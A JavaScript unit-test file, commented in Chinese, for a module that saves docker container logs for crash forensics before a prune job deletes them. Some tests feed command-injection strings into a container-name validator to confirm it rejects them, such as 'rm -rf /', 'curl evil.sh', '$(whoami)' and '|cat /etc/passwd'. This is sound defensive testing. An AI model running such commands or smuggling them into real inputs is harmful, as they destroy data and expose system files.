/**
 * relay-forensics 单测(TOP2 刀1 件③ — task f4f28298)
 *
 * 死因灭失的实证(2026-08-07):三个 relay 容器退出后,janitor.sh --mode frequent
 * 每 15 分钟一次无过滤 `docker container prune -f` 把它们连同 docker logs 一起收走
 * (prune 时刻 04:00:04 / 04:15:04 / 04:30:04 LA 与三次容器死亡一一对应),
 * 事后 forensic 归零,只能靠 exit code 猜死因。
 *
 * 药:容器回调到达的那一刻(容器还没退出)就把 docker logs 落到宿主可见的持久目录。
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, readFileSync, existsSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  captureRelayContainerLogs,
  relayForensicDir,
  isSafeContainerName,
  captureRelayForensicsByShortId,
} from '../relay-forensics.js';

let dir;
beforeEach(() => { dir = mkdtempSync(path.join(tmpdir(), 'relay-forensics-')); });
afterEach(() => { rmSync(dir, { recursive: true, force: true }); });

describe('isSafeContainerName', () => {
  it('放行 docker 合法容器名', () => {
    expect(isSafeContainerName('cecelia-relay-0b7df1ca-a66c5f93')).toBe(true);
  });

  it('拦截命令注入形状(containerId 来自 HTTP 路由参数,会进 shell)', () => {
    for (const evil of [
      'cecelia-relay-x; rm -rf /',
      'cecelia-relay-x && curl evil.sh',
      'cecelia-relay-x$(whoami)',
      'cecelia-relay-x`id`',
      'cecelia-relay-x|cat /etc/passwd',
      '../../etc/passwd',
      '',
    ]) {
      expect(isSafeContainerName(evil)).toBe(false);
    }
  });
});

describe('relayForensicDir', () => {
  it('默认落在 prompt 目录下(compose 已把它 bind-mount 到宿主,不随容器重建蒸发)', () => {
    expect(relayForensicDir({})).toBe('/tmp/cecelia-prompts/relay-forensics');
  });

  it('可被 CECELIA_RELAY_FORENSIC_DIR 覆盖', () => {
    expect(relayForensicDir({ CECELIA_RELAY_FORENSIC_DIR: '/x/y' })).toBe('/x/y');
  });
});

describe('captureRelayContainerLogs', () => {
  const containerId = 'cecelia-relay-0b7df1ca-a66c5f93';

  it('把 docker logs 落盘到 <dir>/<containerId>.log', async () => {
    const execFn = vi.fn(() => 'line-1\nline-2\n');
    const r = await captureRelayContainerLogs({ containerId, execFn, dir });
    expect(r.ok).toBe(true);
    expect(r.path).toBe(path.join(dir, `${containerId}.log`));
    expect(readFileSync(r.path, 'utf8')).toContain('line-1');
    // 必须带 --tail 限幅 + 合并 stderr(死因常只在 stderr)
    const cmd = execFn.mock.calls[0][0];
    expect(cmd).toContain('docker logs');
    expect(cmd).toContain('--tail');
    expect(cmd).toContain(containerId);
  });

  it('容器名不安全 → 拒绝执行任何命令(不给注入机会)', async () => {
    const execFn = vi.fn(() => 'x');
    const r = await captureRelayContainerLogs({ containerId: 'evil; rm -rf /', execFn, dir });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('unsafe_container_name');
    expect(execFn).not.toHaveBeenCalled();
  });

  it('docker 报错(容器已被 prune) → 不抛,返回 ok=false', async () => {
    const execFn = vi.fn(() => { throw new Error('No such container'); });
    const r = await captureRelayContainerLogs({ containerId, execFn, dir });
    expect(r.ok).toBe(false);
    expect(r.reason).toContain('No such container');
  });

  it('日志为空 → 不落空文件(避免制造无信息的噪音文件)', async () => {
    const execFn = vi.fn(() => '   ');
    const r = await captureRelayContainerLogs({ containerId, execFn, dir });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('empty_logs');
    expect(existsSync(path.join(dir, `${containerId}.log`))).toBe(false);
  });

  it('目录不可写 → 不抛(forensic 是尽力而为,绝不能拖累回调 ack)', async () => {
    const execFn = vi.fn(() => 'data');
    // 不可写目录用「普通文件下的子路径」模拟(mkdir 必 ENOTDIR,跨平台快速失败)。
    // 绝不许用 /proc/... :Linux node22 的 mkdirSync recursive 在 procfs 上无限重试
    // 死循环(实测 CPU 100% 永不返回),曾把 CI brain-unit 整个分片挂死 5 轮——
    // macOS 无 /proc 所以本地全绿,是纯 CI 侧陷阱。
    writeFileSync(path.join(dir, 'plainfile'), 'x');
    const r = await captureRelayContainerLogs({
      containerId, execFn, dir: path.join(dir, 'plainfile', 'sub'),
    });
    expect(r.ok).toBe(false);
  });

  // 本函数在 callback 路由里被 await。取日志若走 execSync,Brain 整个事件循环
  // 会被按住最长 timeout 那么久(15s)——一次容器回调足以把 Brain 打成假死。
  it('取日志必须真异步,不能按住事件循环', async () => {
    let ticked = false;
    const execFn = () => new Promise((resolve) => setImmediate(() => {
      ticked = true;
      resolve('async-line\n');
    }));
    const r = await captureRelayContainerLogs({ containerId, execFn, dir });
    // execFn 返回 Promise 时必须被 await 到底,而不是把 Promise 对象当字符串写盘
    expect(ticked).toBe(true);
    expect(r.ok).toBe(true);
    expect(readFileSync(r.path, 'utf8')).toContain('async-line');
  });
});

describe('captureRelayForensicsByShortId', () => {
  // 容器真名是 cecelia-relay-<short8>-<随机后缀>,后缀在收割侧无从得知。
  // 拿 cecelia-relay-<short8> 直接去 docker logs 只会 no such container —— 等于没做。
  it('按前缀反查真实容器名后逐个落盘(含已退出的)', async () => {
    const execFn = vi.fn(async (cmd) => (
      cmd.includes('ps -a')
        ? 'cecelia-relay-0b7df1ca-a66c5f93\ncecelia-relay-0b7df1ca-old1\n'
        : 'body\n'
    ));
    const r = await captureRelayForensicsByShortId({ shortId: '0b7df1ca', execFn, dir });
    expect(r.captured).toEqual([
      'cecelia-relay-0b7df1ca-a66c5f93',
      'cecelia-relay-0b7df1ca-old1',
    ]);
    // 必须查 ps -a：只查 running 的话尸体一个都看不见
    expect(execFn.mock.calls[0][0]).toContain('ps -a');
  });

  it('docker 不可用 → 不抛,captured 为空', async () => {
    const execFn = vi.fn(() => { throw new Error('docker down'); });
    const r = await captureRelayForensicsByShortId({ shortId: '0b7df1ca', execFn, dir });
    expect(r.captured).toEqual([]);
    expect(r.reason).toContain('docker down');
  });
});
